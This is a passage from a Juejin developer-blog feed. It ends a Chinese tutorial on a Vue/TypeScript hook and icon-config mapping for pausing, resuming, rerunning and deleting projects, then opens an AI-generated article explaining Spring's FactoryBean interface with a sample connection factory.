<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">HandleAction</span> = <span class="hljs-function">(<span class="hljs-params">actionType: ActionIconType, project: ProjectListItem</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;
​
​
<span class="hljs-comment">//操作图标映射-统一处理</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createActionIconConfig</span>(<span class="hljs-params">
  handleAction: HandleAction,
</span>): <span class="hljs-title class_">Record</span>&lt;<span class="hljs-title class_">ActionIconType</span>, <span class="hljs-title class_">ActionIconConfig</span>&gt; {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">pause</span>: {
      <span class="hljs-attr">component</span>: <span class="hljs-variable constant_">ACTION_ICON_COMPONENTS</span>.<span class="hljs-property">pause</span>,
      <span class="hljs-attr">tooltip</span>: <span class="hljs-string">'暂停'</span>,
      <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params">project</span>) =&gt;</span> <span class="hljs-title function_">handleAction</span>(<span class="hljs-string">'pause'</span>, project),
    },
    <span class="hljs-attr">resume</span>: {
      <span class="hljs-attr">component</span>: <span class="hljs-variable constant_">ACTION_ICON_COMPONENTS</span>.<span class="hljs-property">resume</span>,
      <span class="hljs-attr">tooltip</span>: <span class="hljs-string">'恢复'</span>,
      <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params">project</span>) =&gt;</span> <span class="hljs-title function_">handleAction</span>(<span class="hljs-string">'resume'</span>, project),
    },
    <span class="hljs-attr">delete</span>: {
      <span class="hljs-attr">component</span>: <span class="hljs-variable constant_">ACTION_ICON_COMPONENTS</span>.<span class="hljs-property">delete</span>,
      <span class="hljs-attr">tooltip</span>: <span class="hljs-string">'删除'</span>,
      <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params">project</span>) =&gt;</span> <span class="hljs-title function_">handleAction</span>(<span class="hljs-string">'delete'</span>, project),
    },
    <span class="hljs-attr">rerun</span>: {
      <span class="hljs-attr">component</span>: <span class="hljs-variable constant_">ACTION_ICON_COMPONENTS</span>.<span class="hljs-property">rerun</span>,
      <span class="hljs-attr">tooltip</span>: <span class="hljs-string">'重跑'</span>,
      <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params">project</span>) =&gt;</span> <span class="hljs-title function_">handleAction</span>(<span class="hljs-string">'rerun'</span>, project),
    },
  }
}
​
​
<span class="hljs-comment">//判断是否为操作图标类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">isActionIconType</span>(<span class="hljs-params">actionType: <span class="hljs-built_in">string</span></span>): actionType is <span class="hljs-title class_">ActionIconType</span> {
  <span class="hljs-keyword">return</span> [<span class="hljs-string">'pause'</span>, <span class="hljs-string">'resume'</span>, <span class="hljs-string">'delete'</span>, <span class="hljs-string">'rerun'</span>].<span class="hljs-title function_">includes</span>(actionType)
}
</code></pre>
<p>动作-图标映射为什么要加 as const？</p>
<blockquote>
<p>为什么要加as const？</p>
<p>不加 as const 的话，TS 会把它推成一个比较宽泛的类型，比如：</p>
<pre><code class="hljs language-less" lang="less">{
  <span class="hljs-attribute">pause</span>: Component
  <span class="hljs-attribute">resume</span>: Component
  <span class="hljs-attribute">delete</span>: Component
  <span class="hljs-attribute">rerun</span>: Component
}
</code></pre>
<p>加上 as const，TS 会更精确地认为：value 是这些具体组件本身，而不是随便一个 Component</p>
</blockquote>
<p>=&gt; void 的意思？</p>
<blockquote>
<p>=&gt; void：这个函数 不关心返回值 / 不需要返回任何东西</p>
</blockquote>
<p>export type HandleAction = (actionType: ActionIconType, project: ProjectListItem) =&gt; Promise的含义是什么？</p>
<blockquote>
<p>“有这么一种函数：</p>
<ul>
<li>第一个参数叫 actionType，只能是 'pause' | 'resume' | 'delete' | 'rerun'</li>
<li>第二个参数叫 project，是一个 ProjectListItem 对象</li>
<li>这个函数是异步的，返回 Promise</li>
</ul>
</blockquote>
<p>这个函数createActionIconConfig 的输入和产出是什么？</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createActionIconConfig</span>(<span class="hljs-params">
  handleAction: HandleAction,
</span>): <span class="hljs-title class_">Record</span>&lt;<span class="hljs-title class_">ActionIconType</span>, <span class="hljs-title class_">ActionIconConfig</span>&gt;
</code></pre>
<ul>
<li>输入就是 handleAction，对应的类型HandleAction，这是从 index.vue 中传过来的</li>
<li>产出: Record&lt;ActionIconType, ActionIconConfig&gt;</li>
</ul>
<p>Record&lt;K, V&gt; 可以理解成：</p>
<blockquote>
<p>一个对象：</p>
<ul>
<li>key 的类型是 K</li>
<li>value 的类型是 V</li>
</ul>
</blockquote>
<ul>
<li>K = ActionIconType → 'pause' | 'resume' | 'delete' | 'rerun'</li>
<li>V = ActionIconConfig → 每个动作对应一条配置，结构是：</li>
</ul>

<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">component</span>: <span class="hljs-title class_">Component</span>
  <span class="hljs-attr">tooltip</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params">project: ProjectListItem</span>) =&gt;</span> <span class="hljs-built_in">void</span>
}
</code></pre>
<p>所以返回的东西大致长这样：</p>
<pre><code class="hljs language-yaml" lang="yaml">{
  <span class="hljs-attr">pause:</span>  { <span class="hljs-attr">component:</span> <span class="hljs-string">...</span>, <span class="hljs-attr">tooltip:</span> <span class="hljs-string">'暂停'</span>, <span class="hljs-attr">handler:</span> <span class="hljs-string">(...)</span> <span class="hljs-string">=&gt;</span> {} },
  <span class="hljs-attr">resume:</span> { <span class="hljs-attr">component:</span> <span class="hljs-string">...</span>, <span class="hljs-attr">tooltip:</span> <span class="hljs-string">'恢复'</span>, <span class="hljs-attr">handler:</span> <span class="hljs-string">(...)</span> <span class="hljs-string">=&gt;</span> {} },
  <span class="hljs-attr">delete:</span> { <span class="hljs-string">...</span> },
  <span class="hljs-attr">rerun:</span>  { <span class="hljs-string">...</span> },
}
</code></pre>
<blockquote>
<p>也就是说整个一个返回就是配置单对象</p>
</blockquote>
<p>useProjectActions.ts（自定义 hook） 文件：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElMessage</span>, <span class="hljs-title class_">ElMessageBox</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'element-plus'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ProjectService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/services/project'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">ProjectListItem</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/types/project'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">HandleAction</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../actionIcon'</span>
​
<span class="hljs-comment">//项目操作处理函数的参数</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UseProjectActionsOptions</span> {
  <span class="hljs-comment">//刷新项目列表的函数</span>
  <span class="hljs-attr">refreshProjectList</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;
}
​
<span class="hljs-comment">//项目操作处理</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useProjectActions</span>(<span class="hljs-params">options: UseProjectActionsOptions</span>): {
  <span class="hljs-attr">handleAction</span>: <span class="hljs-title class_">HandleAction</span>
} {
  <span class="hljs-keyword">const</span> { refreshProjectList } = options
​
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePause</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">project: ProjectListItem</span>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ProjectService</span>.<span class="hljs-title function_">pauseTrain</span>({ <span class="hljs-attr">projectId</span>: project.<span class="hljs-property">projectId</span> })
      <span class="hljs-keyword">if</span> (response.<span class="hljs-property">code</span> === <span class="hljs-number">1</span>) {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'建图已暂停'</span>)
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshProjectList</span>()
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(response.<span class="hljs-property">message</span> || <span class="hljs-string">'暂停失败'</span>)
      }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">unknown</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'暂停训练失败:'</span>, error)
      <span class="hljs-keyword">const</span> errorMessage = error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">'暂停训练失败'</span>
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(errorMessage)
    }
  }
​
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResume</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">project: ProjectListItem</span>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ProjectService</span>.<span class="hljs-title function_">resumeTrain</span>({ <span class="hljs-attr">projectId</span>: project.<span class="hljs-property">projectId</span> })
      <span class="hljs-keyword">if</span> (response.<span class="hljs-property">code</span> === <span class="hljs-number">1</span>) {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'项目已恢复建图'</span>)
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshProjectList</span>()
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(response.<span class="hljs-property">message</span> || <span class="hljs-string">'恢复失败'</span>)
      }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">unknown</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'恢复训练失败:'</span>, error)
      <span class="hljs-keyword">const</span> errorMessage = error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">'恢复训练失败'</span>
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(errorMessage)
    }
  }
​
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleRerun</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">project: ProjectListItem</span>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ProjectService</span>.<span class="hljs-title function_">restartTrain</span>({ <span class="hljs-attr">projectId</span>: project.<span class="hljs-property">projectId</span> })
      <span class="hljs-keyword">if</span> (response.<span class="hljs-property">code</span> === <span class="hljs-number">1</span>) {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'项目已开始重跑'</span>)
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshProjectList</span>()
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(response.<span class="hljs-property">message</span> || <span class="hljs-string">'重跑失败'</span>)
      }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">unknown</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'重跑项目失败:'</span>, error)
      <span class="hljs-keyword">const</span> errorMessage = error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">'重跑项目失败'</span>
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(errorMessage)
    }
  }
​
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDelete</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">project: ProjectListItem</span>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">`删除后，项目数据不可恢复`</span>, <span class="hljs-string">'确认删除该项目？'</span>, {
        <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">'确定'</span>,
        <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">'取消'</span>,
        <span class="hljs-attr">closeOnClickModal</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">customClass</span>: <span class="hljs-string">'tenant-confirm-messagebox'</span>,
      })
​
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ProjectService</span>.<span class="hljs-title function_">deleteProject</span>({ <span class="hljs-attr">projectId</span>: project.<span class="hljs-property">projectId</span> })
        <span class="hljs-keyword">if</span> (response.<span class="hljs-property">code</span> === <span class="hljs-number">1</span>) {
          <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'删除成功'</span>)
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshProjectList</span>()
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(response.<span class="hljs-property">message</span> || <span class="hljs-string">'删除失败'</span>)
        }
      } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">unknown</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'删除项目失败:'</span>, error)
        <span class="hljs-keyword">const</span> errorMessage = error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-string">'删除项目失败'</span>
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(errorMessage)
      }
    } 
  }
​
  <span class="hljs-comment">//统一入口函数</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">handleAction</span>: <span class="hljs-title class_">HandleAction</span> = <span class="hljs-keyword">async</span> (actionType, project) =&gt; {
    <span class="hljs-keyword">switch</span> (actionType) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'pause'</span>:
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">handlePause</span>(project)
        <span class="hljs-keyword">break</span>
      <span class="hljs-keyword">case</span> <span class="hljs-string">'resume'</span>:
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">handleResume</span>(project)
        <span class="hljs-keyword">break</span>
      <span class="hljs-keyword">case</span> <span class="hljs-string">'rerun'</span>:
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">handleRerun</span>(project)
        <span class="hljs-keyword">break</span>
      <span class="hljs-keyword">case</span> <span class="hljs-string">'delete'</span>:
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">handleDelete</span>(project)
        <span class="hljs-keyword">break</span>
      <span class="hljs-attr">default</span>:
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`未知的操作类型: <span class="hljs-subst">${actionType}</span>`</span>)
    }
  }
​
  <span class="hljs-keyword">return</span> {
    handleAction,
  }
}
​
</code></pre>
<p>其中</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UseProjectActionsOptions</span> {
  <span class="hljs-attr">refreshProjectList</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;
}
</code></pre>
<blockquote>
<p>useProjectActions 接收的那个配置对象里，必须有一个 refreshProjectList 函数</p>
</blockquote>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">export</span> function <span class="hljs-title">useProjectActions</span><span class="hljs-params">(options: UseProjectActionsOptions)</span>: {</span>
  handleAction: HandleAction
} 
</code></pre>
<blockquote>
<p>定义了输入输出，输入一个刷新函数，输出一个处理函数</p>
</blockquote>
<p>然后就是定义项目处理的操作</p>
<p>然后就是通过将这个函数导出，被父组件传递给createActionIconConfig 操作映射</p>
<p>统一入口函数的参数就是createActionIconConfig 传过去的</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Spring进阶】深入理解 FactoryBean：定制化 Bean 的秘密武器]]></title>    <link>https://juejin.cn/post/7581413562485932038</link>    <guid>https://juejin.cn/post/7581413562485932038</guid>    <pubDate>2025-12-09T05:55:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581413562485932038" data-draft-id="7581413562485915654" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Spring进阶】深入理解 FactoryBean：定制化 Bean 的秘密武器"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-09T05:55:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户030480591263"/> <meta itemprop="url" content="https://juejin.cn/user/3793762867478852"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Spring进阶】深入理解 FactoryBean：定制化 Bean 的秘密武器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3793762867478852/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户030480591263
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:55:49.000Z" title="Tue Dec 09 2025 05:55:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>由 Gemini-3.0-pro-preview 生成</p>
</blockquote>
<h2 data-id="heading-0">【Spring进阶】深入理解 FactoryBean：定制化 Bean 的秘密武器</h2>
<h3 data-id="heading-1">前言</h3>
<p>在 Spring 的日常开发中，我们通常使用 <code>@Component</code>、<code>@Service</code> 或者 <code>@Configuration</code> + <code>@Bean</code> 的方式来定义 Bean。对于大多数简单的对象（比如 Controller、Service），这些方式非常直观且高效。</p>
<p>但是，假设我们需要创建一个<strong>初始化过程非常复杂</strong>的对象（例如：需要读取复杂的配置文件、需要连接第三方服务、或者需要动态代理生成的对象），如果把这坨复杂的构建代码全都塞在 <code>@Bean</code> 方法里，代码会显得非常臃肿且难以复用。</p>
<p>这时候，Spring 为我们提供了一个强大的接口——<strong>FactoryBean</strong>。</p>
<p>今天我们就来聊聊 <code>FactoryBean</code> 是什么，以及它如何帮助我们优雅地创建复杂对象。</p>
<hr/>
<h3 data-id="heading-2">什么是 FactoryBean？</h3>
<p><code>FactoryBean</code> 是 Spring 容器中一个特殊的接口。</p>
<ul>
<li><strong>普通 Bean</strong>：Spring 容器直接利用反射调用构造器创建出的对象。</li>
<li><strong>Factory Bean</strong>：它也是一个 Bean，但它是一个**“生产 Bean 的 Bean”**。把它注入容器后，当你向容器索要这个 Bean 时，Spring 不会给你 <code>FactoryBean</code> 本身，而是会调用它的 <code>getObject()</code> 方法，把你真正想要的对象给你。</li>
</ul>
<p>简单来说：<strong>FactoryBean 就像一个工厂里的“外包工人”，Spring 容器（大工厂）把他招进来，不是为了让他当管理层，而是为了让他专门生产某种特定的复杂产品。</strong></p>
<h4 data-id="heading-3">接口定义</h4>
<p><code>FactoryBean</code> 的源码非常简洁，核心就三个方法：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">FactoryBean</span>&lt;T&gt; {
    
    <span class="hljs-comment">// 1. 返回真正需要的对象（核心逻辑写在这里）</span>
    <span class="hljs-meta">@Nullable</span>
    T <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;

    <span class="hljs-comment">// 2. 返回对象的类型</span>
    <span class="hljs-meta">@Nullable</span>
    Class&lt;?&gt; getObjectType();

    <span class="hljs-comment">// 3. 是否是单例（默认为 true）</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSingleton</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-4">实战演练：模拟一个复杂的 Connection 对象</h3>
<p>假设我们需要创建一个 <code>MyConnection</code> 对象，它的创建过程很麻烦，需要拼接 URL 和加载驱动（这里模拟复杂逻辑）。</p>
<h4 data-id="heading-5">1. 定义目标对象</h4>
<p>这是一个普通的 Java 类：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConnection</span> {
    <span class="hljs-keyword">private</span> String connectionInfo;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"连接成功，信息："</span> + connectionInfo);
    }

    <span class="hljs-comment">// 省略 getter/setter</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConnectionInfo</span><span class="hljs-params">(String connectionInfo)</span> {
        <span class="hljs-built_in">this</span>.connectionInfo = connectionInfo;
    }
}
</code></pre>
<h4 data-id="heading-6">2. 实现 FactoryBean</h4>
<p>我们创建一个工厂 Bean，专门用来生产 <code>MyConnection</code>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.FactoryBean;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span> <span class="hljs-comment">// 这里的名字是 "myConnectionFactoryBean"</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConnectionFactoryBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FactoryBean</span>&lt;MyConnection&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> MyConnection <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 这里可以写非常复杂的逻辑</span>
        System.out.println(<span class="hljs-string">"&gt;&gt;&gt; FactoryBean 开始复杂的造车过程..."</span>);
        <span class="hljs-type">MyConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyConnection</span>();
        <span class="hljs-comment">// 模拟复杂初始化</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-string">"jdbc:mysql://localhost:3306/mydb"</span>; 
        conn.setConnectionInfo(<span class="hljs-string">"解密后的配置: "</span> + config);
        <span class="hljs-keyword">return</span> conn;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Class&lt;?&gt; getObjectType() {
        <span class="hljs-keyword">return</span> MyConnection.class;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSingleton</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 确保是单例</span>
    }
}
</code></pre>
